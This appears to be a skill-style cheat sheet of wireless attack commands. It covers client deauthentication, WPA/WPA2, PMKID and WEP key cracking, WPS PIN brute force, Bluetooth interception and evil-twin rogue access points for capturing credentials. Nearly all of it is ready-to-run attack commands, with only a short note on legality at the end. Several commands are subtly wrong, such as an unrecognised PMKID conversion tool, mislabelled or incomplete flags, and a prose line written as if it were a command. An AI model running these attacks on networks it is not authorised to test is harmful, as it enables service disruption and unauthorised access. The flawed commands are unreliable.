# TOOLS Skill: Wireless Security Tools

## Purpose
Master wireless security testing tools.

## WiFi Reconnaissance

### airmon-ng
```bash
# Enable monitor mode
airmon-ng start wlan0

# Disable
airmon-ng stop wlan0mon
```

### airodump-ng
```bash
# Basic capture
airodump-ng wlan0mon

# Specific channel
airodump-ng wlan0mon -c 6

# Capture handshake
airodump-ng wlan0mon -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
```

### airodump-ng Filters
```bash
# MAC filter
airodump-ng wlan0mon --mac

# WPS filter
airodump-ng wlan0mon -M
```

## WiFi Attacks

### Deauthentication
```bash
# Disconnect client
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Broadcast deauth
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Continuous
aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon
```

### WPA/WPA2 Cracking

#### Capture handshake
```bash
# 1. Monitor
airodump-ng wlan0mon -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0

# 2. Deauth to force reconnection
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# 3. Crack
aircrack-ng capture-01.cap -w wordlist.txt
```

#### PMKID Attack
```bash
# 1. Capture PMKID
wlanhcx2cap capture.hcxp
hashcat -m 16800 capture.hcxp wordlist.txt
```

### WEP Cracking

```bash
# Fake auth
aireplay-ng -1 0 -e ESSID -a AA:BB:CC:DD:EE:FF wlan0mon

# ARP replay
aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon

# Crack
aircrack-ng capture-01.cap
```

## WPS Attacks

### Reaver
```bash
# Basic
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# Specific channel
reaver -i wlan0mon -c 6 -b AA:BB:CC:DD:EE:FF -vv

# With timeout
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -t 5 -vv
```

### Bully
```bash
bully -b AA:BB:CC:DD:EE:FF wlan0mon -vv
```

## Bluetooth

### hcitool
```bash
# Scan
hcitool scan

# Inquiry
hcitool inq

# Device info
hcitool info AA:BB:CC:DD:EE:FF
```

### btproxy
```bash
# Bluetooth MITM
python3 btproxy.py -i hci0 -t AA:BB:CC:DD:EE:FF
```

### bluelog
```bash
# Continuous logging
bluelog -i hci0 -o capture.txt
```

## Evil Twin

### hostapd-wpe
```bash
# Rogue AP
hostapd-wpe hostapd-wpe.conf

# With karma
airbase-ng -c 6 -e "Free WiFi" wlan0mon
```

### mana-toolkit
```bash
# Rogue AP with credential capture
mana-toolkit
```

## WPA3

### Attack Limitations
```
- SAE handshake resistant
- Dragonblood (CVE-2019-13377)
- Downgrade attacks possible
- Still vulnerable to rogue AP
```

### Testing
```bash
# Check for WPA3
airodump-ng wlan0mon | grep "WPA3"

# Test for downgrade
hostapd-wpe with karma configuration
```

## Wireless Analysis

### Wireshark Wireless
```
- Monitor 802.11 frames
- Filter: wlan.addr == AA:BB:CC:DD:EE:FF
- Follow: 802.11 decryption
```

### Kismet
```bash
# Start
kismet -i wlan0mon

# Web UI
kismet -i wlan0mon --use-gpsd-gps -s
# Open http://localhost:2501
```

## Tips
```
- Always check local laws
- Only test networks you own
- Use external adapter for monitor mode
- Higher gain antennas help
- Check for WPS before WPA cracking
```
